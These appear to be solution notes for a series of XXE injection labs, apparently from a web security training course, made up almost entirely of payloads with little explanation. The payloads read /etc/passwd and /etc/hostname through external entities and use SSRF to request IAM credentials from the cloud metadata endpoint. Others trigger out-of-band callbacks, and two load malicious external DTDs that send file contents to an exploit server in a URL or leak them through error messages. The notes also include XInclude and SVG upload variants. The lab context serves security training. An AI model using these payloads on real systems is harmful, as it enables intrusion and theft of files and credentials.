# XXE Injection 

## Lab: Exploiting XXE using external entities to retrieve files

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE algo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> 
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

## Lab: Exploiting XXE to perform SSRF attacks

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<stockCheck><productId>
&ssrf;
</productId><storeId>1</storeId></stockCheck>
```

## Lab: Blind XXE with out-of-band interaction

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY blind SYSTEM "https://p3t3y3p79opa2mv8l2nhvlwkabg24t0hp.oastify.com">]>
<stockCheck><productId>&blind;</productId><storeId>1</storeId></stockCheck>
```
 
## Lab: Blind XXE with out-of-band interaction via XML parameter entities

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % oob SYSTEM "https://ta7yo5b0t5q8sx5ihqln89hjnat1hz5o.oastify.com"> %oob;]>
<stockCheck><productId>
</productId><storeId>1</storeId></stockCheck>
```

## Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD 

evil.dtd
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exf SYSTEM 'https://exploit-0aaa00e8038c1a7480c3fcc901b00063.exploit-server.net/?data=%file;'>">
%eval; 
%exf;  
```

request
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0aaa00e8038c1a7480c3fcc901b00063.exploit-server.net/exploit.dtd"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

## Lab: Exploiting blind XXE to retrieve data via error messages

evil.dtd
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///noexisto/%file;'>"> 
%eval; 
%error; 
```

request
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a3800d1044f47a7b93acdce010d0053.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

## Lab: Exploiting XInclude to retrieve files

```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=2
```

## Lab: Exploiting XXE via image file upload

```
------WebKitFormBoundaryDhfXhBbH25DkpSxg
Content-Disposition: form-data; name="avatar"; filename="image.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
